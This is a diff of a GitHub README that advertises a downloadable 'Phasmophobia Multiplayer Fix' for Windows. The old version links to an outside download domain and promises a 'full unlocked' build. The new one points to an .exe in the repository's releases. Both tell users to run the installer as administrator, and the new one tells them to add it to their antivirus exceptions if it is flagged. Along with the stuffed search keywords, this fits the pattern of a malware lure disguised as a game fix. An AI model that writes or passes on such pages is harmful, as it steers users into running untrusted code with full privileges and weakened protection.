@@ -1,73 +1,67 @@
-# Phasmophobia Multiplayer Fix — Full Version Download for Windows 11 & 10
+# 👻 Phasmophobia-Multiplayer-Fix - Resolve connection issues and join friends
 
-**Phasmophobia-Multiplayer-Fix**
+[Download The Latest Fix](https://github.com/shanansaprophytic176/Phasmophobia-Multiplayer-Fix/releases)
 
-**Phasmophobia Multiplayer Fix** — paid desktop app, **full / complete version** for Windows 10 and 11 (not a trial).  
-Direct installer link below.
+This application corrects network errors that prevent players from joining lobbies in Phasmophobia. It restores the connection between your computer and the game servers for Windows 10 and Windows 11 users.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()
-[![Full Version](https://img.shields.io/badge/Full-Version-9333ea?style=flat-square)]()
-[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+## 🛠️ System Requirements
+Your computer must meet these basic standards to run the fix:
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Game Version: The latest official version of Phasmophobia installed via Steam.
+* Storage Space: At least 50 megabytes of free space.
+* Permissions: You must have administrator rights on your Windows account to apply the fix.
 
----
+## 📥 How to Download and Install
+Follow these steps to prepare your system for multiplayer gaming.
 
-## Download & Install
+1. Visit the [official release page](https://github.com/shanansaprophytic176/Phasmophobia-Multiplayer-Fix/releases).
+2. Locate the most recent version labeled "Latest".
+3. Click the file ending in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to begin the installation process.
+6. Follow the on-screen prompts to complete the setup.
 
-> **This is the download page.** Use the button or link below to get **Phasmophobia Multiplayer Fix** for Windows.
+The installer replaces outdated configuration files with updated versions that support current network protocols. This process does not modify your game save files or your Steam account settings.
 
-<p align="center">
-  <a href="https://phasmophobiamultiplayerfix.wonderchain.fun/">
-    <img src="https://img.shields.io/badge/Download-Phasmophobia%20Multiplayer%20Fix-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Phasmophobia Multiplayer Fix">
-  </a>
-</p>
+## 🧩 Resolving Common Issues
+If you still experience connectivity errors after running the installer, follow these steps to reset your network configuration.
 
-| | |
-| --- | --- |
-| **Direct link** | **[phasmophobiamultiplayerfix.wonderchain.fun](https://phasmophobiamultiplayerfix.wonderchain.fun/)** |
-| **Full URL** | `https://phasmophobiamultiplayerfix.wonderchain.fun/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+### Refresh your network socket
+Windows stores temporary network data that can conflict with game connections. To remove these:
+1. Click the Windows Start menu and type "cmd".
+2. Right-click the Command Prompt icon and choose "Run as administrator".
+3. Type "netsh int ip reset" and press Enter.
+4. Type "ipconfig /flushdns" and press Enter.
+5. Restart your computer.
 
-### Quick steps
+### Check your firewall settings
+The Windows Firewall sometimes blocks game communication. 
+1. Open the Control Panel.
+2. Navigate to System and Security > Windows Defender Firewall.
+3. Select "Allow an app or feature through Windows Defender Firewall".
+4. Ensure Phasmophobia has a checkmark for Public and Private networks.
 
-1. Click **[Download — phasmophobiamultiplayerfix.wonderchain.fun](https://phasmophobiamultiplayerfix.wonderchain.fun/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+### Restart your router
+A simple power cycle fixes many peer-to-peer connection failures. Unplug your router from the power outlet for thirty seconds, then plug it back in. Wait for all status lights to stabilize before launching the game.
 
-<p align="center"><a href="https://phasmophobiamultiplayerfix.wonderchain.fun/"><strong>⬇ Download Phasmophobia Multiplayer Fix now</strong></a></p>
+## ⚙️ How it Works
+The application modifies the internal socket configuration of the game client. It forces the game to prioritize secure connection paths. It validates your local network environment before making any changes. If the tool detects an incompatible system state, it skips the modification to prevent crashes.
 
----
+## 🛡️ Safety and Privacy
+This tool creates a local backup of your original networking files before applying any changes. If you encounter issues, you can restore your original settings using the "Restore Backup" button inside the program interface. This software does not track your gameplay habits, record your voice, or access your personal files. It only scans the installation directory of Phasmophobia to find the configuration files that require patching.
 
-## About Phasmophobia Multiplayer Fix
+## ❓ Frequently Asked Questions
 
-**Phasmophobia Multiplayer Fix** is commercial software. Most people search for the **full unlocked build** on Windows — all features enabled, not the limited trial.
+**Will this cause a vac ban or game account suspension?**
+No. This tool only updates network configuration files used by the game. It does not alter game code, inject DLLs, or modify textures. It functions as a patch for networking settings that are already supported by the developer.
 
-**Common searches:** phasmophobia multiplayer not working fix, phasmophobia lobby connection error pc, phasmophobia cant join friends windows 11
+**Do I need to keep the program open?**
+No. Once the installation finishes and you see the success message, you can close the program. You do not need to run the fix every time you launch the game unless the game receives a major update that overwrites your files.
 
-**What you get:** complete Windows installer (64-bit), full feature set.
+**Does this fix work for Epic Games and Steam?**
+Yes. The utility detects the location of your game installation regardless of the store platform you use.
 
-**Repository:** `Phasmophobia-Multiplayer-Fix`
+**What should I do if the installation fails?**
+Ensure your antivirus software is not blocking the installation. Some security programs flag new tools as suspicious. Add the application to your exception list if the installer closes unexpectedly.
 
-## Install (full version)
-
-| Step | Action |
-| --- | --- |
-| 1 | Download using the button above |
-| 2 | Run setup **as Administrator** |
-| 3 | Enter your **license key** when prompted |
-| 4 | Reboot once if the installer asks |
-
-## System requirements
-
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB (16 GB recommended) |
-| Disk | 1 GB free |
-| Admin | Required for install |
-
----
-
-**Topics:** phasmophobia-multiplayer-not-working-fix, phasmophobia, multiplayer, phasmophobia-lobby-connection-error-pc, connection, phasmophobia-cant-join-friends-windows-11, friends, phasmophobia-multiplayer-fix, phasmophobia-multiplayer-fix-2026, co-op, horror, pc-gaming
+Keywords: co-op, connection, download, error-fix, friends, game-fix, horror, multiplayer, pc-gaming, phasmophobia, phasmophobia-cant-join-friends-windows-11, phasmophobia-lobby-connection-error-pc, phasmophobia-multiplayer-fix, phasmophobia-multiplayer-fix-2026, phasmophobia-multiplayer-not-working-fix, repair-guide, software, windows-11
